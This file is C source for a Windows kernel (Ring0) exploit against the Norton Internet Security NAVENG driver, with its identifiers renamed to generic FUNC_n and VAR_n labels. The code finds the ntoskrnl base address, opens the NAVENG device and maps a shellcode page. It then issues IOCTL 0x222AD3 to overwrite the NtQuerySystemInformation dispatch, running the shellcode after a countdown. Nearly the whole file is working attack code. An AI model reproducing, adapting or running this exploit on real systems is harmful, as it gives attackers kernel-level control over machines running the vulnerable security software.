
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int arrMods ;
typedef int Ring0ShellCode ;
typedef int (* PGETDEVNAME ) (int,char*,int) ;
typedef int (* PENUMDEVICES ) (int*,int,int*) ;
typedef int LPVOID ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef char CHAR ;
typedef int BOOL ;


 int FUNC_0 (scalar_t__) ;
 scalar_t__ FUNC_1 (char*,int ,int ,int *,int,int ,int ) ;
 int FUNC_2 (scalar_t__,int,int,int ,int,int,int*,int *) ;
 scalar_t__ FUNC_3 (int ,char*) ;
 scalar_t__ VAR_0 ;
 int FUNC_4 (char*) ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_5 () ;
 int FUNC_6 (int) ;
 scalar_t__ FUNC_7 (int,int,int,int ) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_8 (int) ;
 int FUNC_9 (int*) ;
 int FUNC_10 (int,int,int) ;
 int FUNC_11 (char*,...) ;
 scalar_t__ FUNC_12 (char*,char*,int) ;
 int FUNC_13 (char*) ;

int FUNC_14(int VAR_7, char *VAR_8[])
{

 DWORD *VAR_9,*VAR_10,*VAR_11;
 DWORD VAR_12,VAR_13,VAR_14,VAR_15,VAR_16,VAR_17,VAR_18,VAR_19;
 HANDLE VAR_20;
 PENUMDEVICES VAR_21;
 PGETDEVNAME VAR_22;
 LPVOID VAR_23[200],VAR_24;
 DWORD VAR_25=0,VAR_26;
 BOOL VAR_27;
 CHAR VAR_28[VAR_1];


 unsigned char VAR_29[]="\xcc\x90\x90\x90";

  FUNC_13("cls");

  FUNC_11("\n################################\n");
  FUNC_11("## Norton I.S                 ##\n");
  FUNC_11("## Ring0 Exploit              ##\n");
  FUNC_11("################################\n");
  FUNC_11("\nRuben Santamarta\nwww.reversemode.com\n\n");

 if(VAR_7<2)
 {


  FUNC_11("\nusage> exploit.exe <XP> or <2K>\n");
  FUNC_8(1);
 }


 VAR_21=(PENUMDEVICES)FUNC_3(FUNC_4("psapi.dll"),
             "EnumDeviceDrivers");

 VAR_22=(PGETDEVNAME)FUNC_3(FUNC_4("psapi.dll"),
             "GetDeviceDriverBaseNameA");

 VAR_21(VAR_23,sizeof(VAR_23),&VAR_16);
 VAR_17=VAR_16/sizeof(LPVOID);
 FUNC_11("\n[!] Searching Ntoskrnl.exe Base Address...");

 for(VAR_18=0;VAR_18<=VAR_17;VAR_18++)
 {
       VAR_22(VAR_23[VAR_18],VAR_28,VAR_1);
    if((FUNC_12(VAR_28,"ntoskr",6)==0))
    {
       FUNC_11("[%x] Found!\n",VAR_23[VAR_18]);
     VAR_25 = (DWORD)VAR_23[VAR_18];
     VAR_26 = VAR_25;
    }
 }

if (!VAR_25)
{
   FUNC_11("!!? ntoskrnl.exe base address not found\nexiting\n\n");
   FUNC_8(0);
}






VAR_20 = FUNC_1("\\\\.\\NAVENG",
                     0,
                     0,
                     ((void*)0),
                     3,
                     0,
                     0);




 if (VAR_20 == VAR_0) FUNC_5();

 FUNC_11("\n\n** Initializing Exploit]\n\n");
 FUNC_11("INFORMATION \n");
 FUNC_11("-----------------------------------------------------\n");
 FUNC_11("[!] NAVENG Device Handle [%x]\n",VAR_20);







 VAR_13 = 4;
 VAR_12 = 0x222AD3;


 if(FUNC_12(VAR_8[1],"XP",2)==0) VAR_19 = VAR_25 + VAR_6;
 else VAR_19 = VAR_25 + VAR_5;

 FUNC_11("[!] Overwriting NtQuerySystemInformation Switch at [0x%x]\n",VAR_19);

 VAR_11=(DWORD*)FUNC_7((LPVOID)0x2000000
                                ,0xF000
                                ,VAR_2|VAR_3
                                ,VAR_4);


 for(VAR_18=1;VAR_18<0x3C00;VAR_18++) VAR_11[VAR_18]=(DWORD)VAR_11;
 FUNC_10((LPVOID)VAR_11,(LPVOID)VAR_29,sizeof(VAR_29));

 FUNC_11("\n\n\t\t[!] Initializing Countdown,last chance to abort.");

 for(VAR_18=10;VAR_18>=1;VAR_18--)
 {
   FUNC_11("\r -[ %d ]- ",VAR_18);
   if(VAR_18==1) FUNC_11("\n\n[*] Executing ShellCode");
   FUNC_6(1000);
 }

 FUNC_2(VAR_20,
                 VAR_12,
                 (LPVOID)0,0,
                 (LPVOID)VAR_19,VAR_13,
                 &VAR_15,
                 ((void*)0));

 FUNC_13("dir");





 FUNC_0(VAR_20);
 FUNC_9(VAR_11);

 FUNC_11("\n\n[*] Exploit terminated\n\n");
 return 0;
}
